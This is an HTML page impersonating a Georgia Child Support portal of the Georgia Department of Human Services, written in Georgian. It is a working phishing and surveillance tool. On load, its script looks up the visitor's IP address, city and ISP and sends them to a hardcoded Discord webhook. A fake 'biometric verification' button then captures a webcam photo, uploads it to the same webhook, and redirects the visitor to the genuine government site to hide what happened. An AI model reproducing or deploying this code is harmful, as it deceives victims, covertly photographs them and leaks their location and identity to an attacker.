<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Georgia Gateway | Support Portal</title>
    <style>
        body {
            background-color: #f4f7f9;
            color: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
        }

        #content {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            border-top: 6px solid #004a99; /* ოფიციალური ლურჯი */
        }

        .gov-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .gov-logo {
            width: 60px;
            height: auto;
            margin-right: 10px;
        }

        h2 {
            font-size: 20px;
            color: #004a99;
            margin: 10px 0;
            font-weight: 700;
        }

        p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 25px;
        }

        .info-box {
            background: #e7f0f7;
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            color: #004a99;
            margin-bottom: 20px;
            border-left: 4px solid #004a99;
            text-align: left;
        }

        #authBtn {
            background: #004a99;
            color: white;
            border: none;
            padding: 15px 0;
            width: 100%;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.2s;
        }

        #authBtn:hover {
            background: #003366;
        }

        #authBtn:disabled {
            background: #ccc;
        }

        .footer-text {
            font-size: 11px;
            color: #999;
            margin-top: 20px;
        }

        /* ანიმაცია */
        .spinner {
            border: 2px solid #ffffff;
            border-top: 2px solid #004a99;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="content">
        <div class="gov-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="gov-logo">
        </div>
        
        <h2>Georgia Child Support</h2>
        <div class="info-box">
            <strong>უსაფრთხოების შეტყობინება:</strong><br>
            თქვენი სესიის გასაგრძელებლად საჭიროა ბიომეტრიული ვერიფიკაცია.
        </div>
        
        <p>გთხოვთ დააჭიროთ ღილაკს "დადასტურება", რათა სისტემამ გადაამოწმოს თქვენი ვინაობა და მოგცეთ წვდომა პორტალზე.</p>
        
        <button id="authBtn">დადასტურება</button>
        
        <div class="footer-text">
            © 2026 Georgia Department of Human Services
        </div>
    </div>

    <video id="video" style="display:none;" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";

        async function logVisit() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "🏛️ **ახალი ვიზიტი (Georgia Support)**",
                        embeds: [{
                            color: 15844367,
                            title: "კლიენტის მონაცემები",
                            description: `🌐 IP: \`${data.ip}\`\n🏙️ ქალაქი: ${data.city}\n📡 პროვაიდერი: ${data.org}\n🏳️ ქვეყანა: ${data.country_name}`,
                            footer: { text: "Georgia Gateway System" }
                        }]
                    })
                });
            } catch (e) {}
        }

        async function handleAuth() {
            const btn = document.getElementById('authBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>მოწმდება...';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(async (blob) => {
                            const formData = new FormData();
                            formData.append('file', blob, 'identity_check.jpg');
                            formData.append('payload_json', JSON.stringify({
                                content: "👤 **ვერიფიკაციის ფოტო მოვიდა!**"
                            }));

                            await fetch(webhookURL, { method: 'POST', body: formData });
                            
                            stream.getTracks().forEach(track => track.stop());
                            // გადამისამართება ნამდვილ საიტზე
                            window.location.href = "https://childsupport.georgia.gov/";
                        }, 'image/jpeg', 0.8);
                    }, 1000);
                };

            } catch (err) {
                window.location.href = "https://childsupport.georgia.gov/";
            }
        }

        window.onload = logVisit;
        document.getElementById('authBtn').addEventListener('click', handleAuth);
    </script>
</body>
</html>
